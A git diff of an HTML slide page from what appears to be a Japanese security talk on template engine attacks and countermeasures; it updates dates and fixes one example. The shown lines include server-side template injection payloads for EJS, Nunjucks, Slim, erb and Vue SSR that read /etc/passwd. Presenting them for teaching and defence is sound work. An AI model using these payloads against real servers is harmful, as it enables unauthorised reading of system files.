@@ -26,11 +26,11 @@
             style="border:0;">
     </iframe>
     <aside class="slide-controller">
-        <span class="slide-date-published">公開日:<time itemprop="datePublished" datetime="2019-08-09" id="datePublished">
-            2019-08-09
+        <span class="slide-date-published">公開日:<time itemprop="datePublished" datetime="2019-08-10" id="datePublished">
+            2019-08-10
         </time></span>
-        <span class="slide-date-modified">変更日:<time itemprop="dateModified" datetime="2019-08-09" id="dateModified">
-            2019-08-09
+        <span class="slide-date-modified">変更日:<time itemprop="dateModified" datetime="2019-08-10" id="dateModified">
+            2019-08-10
         </time></span>
         <a href="https://azu.github.io/slide//2019/template-engine/template-engine-security.pdf" title="クライアントサイドからサーバサイドまで破壊するテンプレートエンジンを利用した攻撃と対策">
             <svg xmlns="http://www.w3.org/2000/svg"
@@ -638,7 +638,7 @@ module.exports = app;</code></pre>
 <p><a href="https://ejs.co/">EJS</a></p>
 <pre><code>&lt;%% global.process.mainModule.require('fs').readFileSync('/etc/passwd').toString() %%&gt;</code></pre><p><a href="https://mozilla.github.io/nunjucks/">Nunjucks</a></p>
 <pre><code>{% global.process.mainModule.require('fs').readFileSync('/etc/passwd').toString() }</code></pre><p><a href="http://slim-lang.com/">Slim</a></p>
-<pre><code>#{ File.open('/etc/passwd').read %&gt;}</code></pre><p><a href="https://ruby-doc.org/stdlib-2.6.2/libdoc/erb/rdoc/ERB.html">erb</a></p>
+<pre><code>#{ File.open('/etc/passwd').read }</code></pre><p><a href="https://ruby-doc.org/stdlib-2.6.2/libdoc/erb/rdoc/ERB.html">erb</a></p>
 <pre><code>&lt;%= File.open('/etc/passwd').read %&gt;</code></pre><p><a href="https://vuejs.org/">Vue(SSR)</a></p>
 <pre><code>{{ global.process.mainModule.require('fs').readFileSync('/etc/passwd').toString() }}</code></pre><hr>
 <h1 id="user-defined-template-と-server-side-template-injection">User Defined Template と Server Side Template Injection</h1>
